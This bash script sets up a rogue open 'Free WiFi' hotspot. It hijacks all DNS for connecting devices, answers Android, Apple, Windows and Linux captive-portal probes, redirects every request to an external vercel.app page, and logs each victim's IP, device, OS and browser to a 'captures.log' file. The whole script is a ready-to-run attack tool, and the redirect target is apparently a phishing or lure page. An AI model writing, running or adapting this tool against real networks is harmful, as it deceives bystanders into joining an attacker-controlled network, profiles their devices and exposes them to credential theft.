#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════╗
# ║   ARC PORTAL v3.1 — OPEN NETWORK EDITION                        ║
# ║   Free WiFi - No Password Required                              ║
# ╚══════════════════════════════════════════════════════════════════╝

PORTAL_IP="10.66.66.1"
PORTAL_URL="https://arc-xserver.vercel.app/"
AP_SSID="Free WiFi"
WEBROOT="/tmp/arcportal"
IFACE=""
INTERNET=""
CHANNEL="6"

[[ $EUID -ne 0 ]] && exec sudo "$0" "$@"

# Colors
RED='\033[38;5;196m'; GOLD='\033[38;5;220m'; CYAN='\033[38;5;51m'
GREEN='\033[38;5;82m'; ORANGE='\033[38;5;208m'; NC='\033[0m'

cleanup() {
    echo -e "\n${ORANGE}[!]${NC} Shutting down ARC Portal..."
    killall hostapd dnsmasq python3 2>/dev/null
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    ip addr flush dev "$IFACE" 2>/dev/null
    systemctl restart NetworkManager 2>/dev/null
    echo -e "${GREEN}[✓]${NC} Cleanup complete"
    exit 0
}
trap cleanup INT TERM

banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
     █████╗ ██████╗  ██████╗    ██████╗  ██████╗ ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔════╝    ██╔══██╗██╔═══██╗██╔══██╗██╔════╝
    ███████║██████╔╝██║         ██████╔╝██║   ██║██║  ██║███████╗
    ██╔══██║██╔══██╗██║         ██╔═══╝ ██║   ██║██║  ██║╚════██║
    ██║  ██║██║  ██║╚██████╗    ██║     ╚██████╔╝██████╔╝███████║
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝
                    S T A R K   I N D U S T R I E S
EOF
    echo -e "${NC}"
}

detect_interfaces() {
    echo -e "${GOLD}[J.A.R.V.I.S.]${NC} Initializing system scan..."
    
    # Find wireless interface
    IFACE=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | head -1)
    [[ -z "$IFACE" ]] && IFACE=$(ip link show | grep -E "wl|wifi" | head -1 | cut -d: -f2 | tr -d ' ')
    
    if [[ -z "$IFACE" ]]; then
        echo -e "${RED}[ERROR]${NC} No wireless interface detected!"
        exit 1
    fi
    
    # Check AP support
    if ! iw list 2>/dev/null | grep -q "AP"; then
        echo -e "${RED}[ERROR]${NC} Interface does not support Access Point mode"
        exit 1
    fi
    
    # Find internet interface (not the WiFi one)
    INTERNET=$(ip route show default | grep -v "$IFACE" | awk '{print $5}' | head -1)
    
    echo -e "${GREEN}[✓]${NC} WiFi Interface: ${CYAN}$IFACE${NC}"
    echo -e "${GREEN}[✓]${NC} Internet Gateway: ${CYAN}${INTERNET:-None (offline mode)}${NC}"
}

install_deps() {
    echo -e "${GOLD}[J.A.R.V.I.S.]${NC} Installing components..."
    
    # Arch
    if command -v pacman &>/dev/null; then
        pacman -S --needed --noconfirm hostapd dnsmasq iptables python python-pip iw 2>/dev/null
    # Debian/Ubuntu
    elif command -v apt-get &>/dev/null; then
        apt-get update && apt-get install -y hostapd dnsmasq iptables python3 python3-pip iw
    # Fedora
    elif command -v dnf &>/dev/null; then
        dnf install -y hostapd dnsmasq iptables python3 python3-pip iw
    fi
    
    pip3 install user_agents 2>/dev/null || pip install user_agents 2>/dev/null
    mkdir -p "$WEBROOT"
}

setup_network() {
    echo -e "${GOLD}[J.A.R.V.I.S.]${NC} Configuring network architecture..."
    
    # Kill conflicting services
    systemctl stop NetworkManager wpa_supplicant 2>/dev/null
    killall wpa_supplicant hostapd dnsmasq 2>/dev/null
    sleep 2
    
    # Bring up interface
    ip link set "$IFACE" down
    ip addr flush dev "$IFACE"
    ip addr add "$PORTAL_IP/24" dev "$IFACE"
    ip link set "$IFACE" up
    
    # Enable forwarding
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    
    # Setup NAT if internet available
    if [[ -n "$INTERNET" ]]; then
        iptables -t nat -F
        iptables -F
        iptables -t nat -A POSTROUTING -o "$INTERNET" -j MASQUERADE
        iptables -A FORWARD -i "$IFACE" -o "$INTERNET" -j ACCEPT
        iptables -A FORWARD -i "$INTERNET" -o "$IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
        echo -e "${GREEN}[✓]${NC} NAT routing enabled"
    fi
    
    # Block all DNS except ours
    iptables -A INPUT -i "$IFACE" -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -i "$IFACE" -p tcp --dport 53 -j ACCEPT
}

create_hostapd_config() {
    # OPEN NETWORK - NO PASSWORD
    cat > /tmp/hostapd-arc.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=$CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
    echo -e "${GREEN}[✓]${NC} AP Configuration created (OPEN NETWORK)"
}

create_dnsmasq_config() {
    cat > /tmp/dnsmasq-arc.conf << EOF
interface=$IFACE
bind-interfaces
port=53
dhcp-range=10.66.66.10,10.66.66.250,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
server=8.8.8.8
address=/#/$PORTAL_IP
log-queries
log-dhcp
EOF
    echo -e "${GREEN}[✓]${NC} DNS/DHCP Configuration created"
}

create_captive_server() {
    cat > "$WEBROOT/captive.py" << 'PYEOF'
#!/usr/bin/env python3
import http.server, socketserver, threading, json, datetime, re, time
import user_agents, socket, sys

PORTAL_URL = "https://arc-xserver.vercel.app/"
LOG_FILE = "/tmp/arcportal/captures.log"

# Captive portal detection URLs by OS
CAPTIVE_URLS = {
    # Android
    '/generate_204': 'android',
    '/gen_204': 'android',
    '/mobile/status.php': 'android',
    
    # Apple/iOS/macOS
    '/library/test/success.html': 'apple',
    '/hotspot-detect.html': 'apple',
    '/captive': 'apple',
    
    # Windows
    '/connecttest.txt': 'windows',
    '/ncsi.txt': 'windows',
    '/msftconnecttest': 'windows',
    '/msftncsi': 'windows',
    
    # Linux/NetworkManager
    '/nm-check.txt': 'linux',
    '/connectivity-check': 'linux',
    
    # Generic
    '/success.txt': 'generic',
    '/redirect': 'generic',
    '/login': 'generic',
}

DEVICE_ICONS = {
    'android': '📱', 'apple': '🍎', 'windows': '💻', 
    'linux': '🐧', 'tv': '📺', 'generic': '📡'
}

def get_device_info(ua_string):
    try:
        ua = user_agents.parse(ua_string)
        device_type = 'generic'
        
        # Detect TV
        if any(x in ua_string.lower() for x in ['tv', 'smarttv', 'tizen', 'webos', 'bravia', 'roku', 'firetv', 'appletv']):
            device_type = 'tv'
        elif ua.is_mobile:
            device_type = 'android' if 'android' in ua_string.lower() else 'apple'
        elif ua.is_tablet:
            device_type = 'tablet'
        elif ua.is_pc:
            device_type = 'windows' if 'windows' in ua_string.lower() else 'linux'
            
        return {
            'type': device_type,
            'icon': DEVICE_ICONS.get(device_type, '📡'),
            'device': ua.device.family,
            'os': f"{ua.os.family} {ua.os.version_string}",
            'browser': f"{ua.browser.family} {ua.browser.version_string}"
        }
    except:
        return {'type': 'generic', 'icon': '📡', 'device': 'Unknown', 'os': 'Unknown', 'browser': 'Unknown'}

def log_connection(client_ip, user_agent, url, device_info):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    log_entry = {
        'time': timestamp,
        'ip': client_ip,
        'url': url,
        'device': device_info
    }
    
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')
    
    print(f"\033[38;5;220m[{timestamp}]\033[0m {device_info['icon']} \033[38;5;51m{client_ip:15}\033[0m → \033[38;5;82m{device_info['device']} | {device_info['os']}\033[0m")

class CaptiveHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', '')
        host = self.headers.get('Host', '')
        device_info = get_device_info(user_agent)
        
        # Check if this is a captive portal probe
        is_captive_probe = False
        probe_type = 'direct'
        
        for probe_url, os_type in CAPTIVE_URLS.items():
            if probe_url in self.path:
                is_captive_probe = True
                probe_type = os_type
                break
        
        # Special handling for common captive portal domains
        captive_domains = ['captive.apple.com', 'www.msftconnecttest.com', 
                          'connectivitycheck.android.com', 'clients3.google.com',
                          'detectportal.firefox.com', 'nm.check-network.org']
        
        if any(domain in host for domain in captive_domains):
            is_captive_probe = True
        
        log_connection(client_ip, user_agent, self.path, device_info)
        
        if is_captive_probe:
            # Return appropriate response based on OS
            if probe_type == 'android':
                # Android expects a 204 or redirect
                self.send_response(302)
                self.send_header('Location', PORTAL_URL)
                self.send_header('Content-Length', '0')
                self.end_headers()
            elif probe_type == 'apple':
                # Apple expects a specific HTML response
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                html = f'''<!DOCTYPE html>
<html><head>
<meta http-equiv="refresh" content="0;url={PORTAL_URL}">
</head><body>
<script>window.location.href="{PORTAL_URL}";</script>
</body></html>'''
                self.send_header('Content-Length', str(len(html)))
                self.end_headers()
                self.wfile.write(html.encode())
            elif probe_type == 'windows':
                # Windows expects specific success response or redirect
                self.send_response(302)
                self.send_header('Location', PORTAL_URL)
                self.send_header('Content-Length', '0')
                self.end_headers()
            else:
                # Generic redirect
                self.send_response(302)
                self.send_header('Location', PORTAL_URL)
                self.send_header('Content-Length', '0')
                self.end_headers()
        else:
            # Any other request gets redirected to portal
            self.send_response(302)
            self.send_header('Location', PORTAL_URL)
            self.send_header('Content-Length', '0')
            self.end_headers()
    
    def do_POST(self):
        self.do_GET()
    
    def do_HEAD(self):
        self.do_GET()

def start_server():
    with socketserver.ThreadingTCPServer(("", 80), CaptiveHandler) as httpd:
        httpd.allow_reuse_address = True
        print(f"\033[38;5;51m[*] ARC CORE ONLINE\033[0m → Port 80 (Captive Portal Active)")
        httpd.serve_forever()

if __name__ == '__main__':
    start_server()
PYEOF
    chmod +x "$WEBROOT/captive.py"
}

start_services() {
    echo -e "${GOLD}[J.A.R.V.I.S.]${NC} Starting ARC services..."
    
    # Start hostapd (AP)
    hostapd /tmp/hostapd-arc.conf -B
    sleep 2
    if pgrep -x "hostapd" > /dev/null; then
        echo -e "${GREEN}[✓]${NC} Access Point ACTIVE: ${ORANGE}$AP_SSID${NC} (NO PASSWORD)"
    else
        echo -e "${RED}[ERROR]${NC} Failed to start Access Point"
        exit 1
    fi
    
    # Start dnsmasq (DHCP/DNS)
    dnsmasq -C /tmp/dnsmasq-arc.conf
    echo -e "${GREEN}[✓]${NC} DNS/DHCP Server ACTIVE"
    
    # Start captive portal server
    python3 "$WEBROOT/captive.py" &
    CAPTIVE_PID=$!
    echo -e "${GREEN}[✓]${NC} Captive Portal Handler ACTIVE"
    
    # Start dashboard server
    cat > "$WEBROOT/dashboard.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ARC Dashboard | Stark Industries</title>
    <style>
        body { 
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e); 
            color: #00d4ff; 
            font-family: 'Courier New', monospace;
            padding: 40px;
        }
        h1 { color: #ffd700; text-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
        .status { 
            background: rgba(0, 212, 255, 0.1); 
            border: 1px solid #00d4ff;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        .online { color: #00ff88; }
        .open { color: #ff6b6b; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🔥 ARC PORTAL STATUS</h1>
    <div class="status">
        <h2>System Status: <span class="online">ONLINE</span></h2>
        <p>Network: <span class="open">Free WiFi (OPEN - No Password)</span></p>
        <p>Portal URL: https://arc-xserver.vercel.app/</p>
        <p>All connected devices will be redirected automatically</p>
    </div>
</body>
</html>
HTMLEOF

    python3 -m http.server 8080 --directory "$WEBROOT" --bind 0.0.0.0 >/dev/null 2>&1 &
    DASH_PID=$!
    echo -e "${GREEN}[✓]${NC} Dashboard Server ACTIVE: ${CYAN}http://$PORTAL_IP:8080/dashboard.html${NC}"
}

show_status() {
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}           ${GOLD}🔥 ARC PORTAL OPERATIONAL 🔥${NC}                      ${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${GOLD}Network:${NC}    ${ORANGE}Free WiFi${NC} (OPEN NETWORK)                     ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GOLD}Password:${NC}   ${GREEN}NONE - No Password Required${NC}                  ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GOLD}Gateway:${NC}    $PORTAL_IP                                    ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GOLD}Portal:${NC}     $PORTAL_URL ${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${GOLD}Device Detection:${NC} Android, iOS, Windows, Linux, Smart TV   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GOLD}Auto-Open:${NC}        ENABLED (Captive Portal)                ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${ORANGE}[!]${NC} Press Ctrl+C to shutdown"
    echo ""
    echo -e "${GOLD}[J.A.R.V.I.S.]${NC} Monitoring connections..."
    echo ""
    
    # Show live connection log
    tail -f /tmp/arcportal/captures.log 2>/dev/null || sleep infinity
}

# MAIN EXECUTION
banner
detect_interfaces
install_deps
setup_network
create_hostapd_config
create_dnsmasq_config
create_captive_server
start_services
show_status
